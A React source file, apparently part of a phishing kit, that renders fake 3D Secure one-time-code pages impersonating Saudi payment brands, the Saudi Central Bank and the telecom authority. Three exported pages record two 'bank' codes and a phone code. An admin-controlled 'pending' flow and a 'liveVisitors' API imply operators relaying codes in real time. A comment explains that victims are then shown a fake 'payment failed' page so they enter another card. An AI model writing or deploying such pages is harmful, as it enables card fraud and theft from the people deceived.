import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession, getSessionId } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useState, useEffect } from "react";
import { toast } from "sonner";
import { ArrowLeft, MessageSquare, ShieldCheck, Timer, Smartphone, BadgeCheck, Lock } from "lucide-react";
import { ASSETS } from "@/lib/assets";
import { trpc } from "@/lib/trpc";

interface OtpPageProps {
  step: number;
  stepKey: string;
  title: string;
  subtitle: string;
  badge: string;
  nextRoute: string;
  variant?: "orange" | "green" | "blue" | "red";
  /** الحد الأقصى لطول الرمز - 6 افتراضياً، يقبل 4 أو 6 */
  maxLength?: number;
  /** الحد الأدنى المقبول للإرسال */
  minLength?: number;
  /** عند true يضع cardStatus=pending قبل التوجيه (لانتظار قرار الأدمن) */
  awaitAdminAfter?: boolean;
}

export default function OtpPage({
  step,
  stepKey,
  title,
  subtitle,
  badge,
  nextRoute,
  variant = "orange",
  maxLength = 6,
  minLength = 4,
  awaitAdminAfter = false,
}: OtpPageProps) {
  const [, setLocation] = useLocation();
  const { recordStep, isSubmitting } = useStepSession();
  const [otp, setOtp] = useState("");
  const [timeLeft, setTimeLeft] = useState(300); // 5 دقائق

  const setCardStatusMutation = trpc.liveVisitors.setCardStatus.useMutation();

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, "0")}`;
  };

  const handleSubmit = async () => {
    if (otp.length < minLength) {
      return toast.error(`الرجاء إدخال رمز التحقق (${minLength} إلى ${maxLength} أرقام)`);
    }
    await recordStep(stepKey, { otp });

    if (awaitAdminAfter) {
      // إعادة وضع البطاقة في pending ليتحكم الأدمن في المرور التالي
      try {
        await setCardStatusMutation.mutateAsync({
          sessionId: getSessionId(),
          status: "pending",
        });
      } catch (e) {
        // غير حرج
      }
      setLocation("/card-wait");
    } else {
      setLocation(nextRoute);
    }
  };

  // إنشاء خانات OTP حسب الطول
  const slots = Array.from({ length: maxLength }, (_, i) => (
    <InputOTPSlot key={i} index={i} className="w-11 h-14 text-xl border-gray-300" />
  ));

  return (
    <StepLayout step={step} total={10} badge={badge} title={title} subtitle={subtitle} variant={variant}>
      {/* شريط الثقة العلوي */}
      <div className="mb-4 grid grid-cols-3 gap-2 text-center">
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <ShieldCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">3D Secure</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <Lock className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">تشفير عالي</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <BadgeCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">معتمد بنكياً</span>
        </div>
      </div>

      <Card className="p-6 md:p-10 shadow-xl border-gray-200 bg-white text-center relative overflow-hidden">
        {/* شريط علوي */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-emerald-500 via-amber-400 to-emerald-500" />

        {/* شعارات بوابات الدفع */}
        <div className="flex justify-center items-center gap-4 mb-6 pb-6 border-b border-gray-100">
          <img src={ASSETS.madaLogo} alt="مدى" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.sadadLogo} alt="سداد" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.applePayMada} alt="Apple Pay" className="h-7 object-contain" />
        </div>

        {/* أيقونة الرسالة مع رنين */}
        <div className="relative w-20 h-20 mx-auto mb-5">
          <div className="absolute inset-0 rounded-full bg-emerald-100 animate-ping opacity-60" style={{ animationDuration: "2s" }} />
          <div className="relative w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 text-white flex items-center justify-center shadow-lg">
            <MessageSquare className="w-9 h-9" />
          </div>
        </div>

        <h3 className="text-xl md:text-2xl font-extrabold text-gray-900 mb-2">
          التحقق الثنائي (3D Secure)
        </h3>
        <p className="text-gray-600 text-sm leading-relaxed mb-3 max-w-md mx-auto">
          لإتمام العملية، الرجاء إدخال رمز التحقق المرسل عبر رسالة نصية إلى رقم جوالك المسجل لدى البنك
        </p>

        {/* رقم الجوال */}
        <div className="inline-flex items-center gap-2 bg-gray-50 border border-gray-200 px-4 py-2 rounded-full mb-6">
          <Smartphone className="w-4 h-4 text-gray-500" />
          <span className="font-mono font-bold text-gray-900 text-base" dir="ltr">
            +966 5X XXX XXXX
          </span>
        </div>

        {/* خانات الإدخال */}
        <div className="flex justify-center mb-3">
          <InputOTP maxLength={maxLength} value={otp} onChange={setOtp}>
            <InputOTPGroup dir="ltr" className="gap-2">
              {slots}
            </InputOTPGroup>
          </InputOTP>
        </div>

        {/* تلميح المرونة */}
        <p className="text-[11px] text-gray-500 mb-6">
          أدخل {minLength} أو {maxLength} أرقام حسب الرمز المرسل إليك
        </p>

        <Button
          onClick={handleSubmit}
          disabled={isSubmitting || otp.length < minLength || timeLeft === 0}
          size="lg"
          className="w-full bg-gradient-to-r from-emerald-600 to-emerald-700 hover:from-emerald-700 hover:to-emerald-800 disabled:from-gray-400 disabled:to-gray-500 text-white font-bold h-14 text-lg shadow-md rounded-xl active:scale-[0.98] transition-transform duration-150"
          style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
        >
          <Lock className="w-5 h-5 ml-2" />
          تأكيد الرمز
          <ArrowLeft className="w-5 h-5 mr-2" />
        </Button>

        <div className="mt-5 flex flex-col items-center justify-center gap-3 text-sm">
          <div
            className={`flex items-center gap-2 font-mono font-bold px-4 py-2 rounded-full ${
              timeLeft < 60
                ? "text-red-700 bg-red-50 border border-red-200"
                : "text-emerald-700 bg-emerald-50 border border-emerald-200"
            }`}
          >
            <Timer className="w-4 h-4" />
            {formatTime(timeLeft)}
          </div>
          <div className="flex items-center gap-2 text-[11px] text-gray-500">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            عملية دفع آمنة وموثقة - البنك المركزي السعودي
          </div>
        </div>
      </Card>
    </StepLayout>
  );
}

// التصديرات لإعادة الاستخدام
export function CodePay() {
  return (
    <OtpPage
      step={6}
      stepKey="code_pay"
      badge="رمز التحقق الأول - 383 ر.س"
      title="تأكيد عملية الدفع"
      subtitle="أدخل رمز التحقق المرسل لإتمام دفع 383 ريال سعودي"
      nextRoute="/pay-code"
      variant="green"
      maxLength={6}
      minLength={4}
    />
  );
}

export function PayCode() {
  return (
    <OtpPage
      step={7}
      stepKey="pay_code"
      badge="رمز التحقق الثاني - تأكيد العملية"
      title="تأكيد نهائي لعملية الدفع"
      subtitle="رمز التحقق الإضافي المرسل من البنك"
      nextRoute="/number"
      variant="green"
      maxLength={6}
      minLength={4}
    />
  );
}

export function NCode() {
  return (
    <OtpPage
      step={9}
      stepKey="n_code"
      badge="تأكيد رقم الجوال - هيئة الاتصالات"
      title="رمز التحقق من الجوال"
      subtitle="أدخل رمز التحقق المرسل إلى رقم جوالك من هيئة الاتصالات السعودية"
      // بعد إدخال رمز التحقق من الجوال يتم عرض صفحة "فشلت عملية الدفع" ليُعيد المستخدم إدخال بطاقة أخرى
      nextRoute="/cardpayment-error"
      variant="blue"
      maxLength={6}
      minLength={4}
    />
  );
}
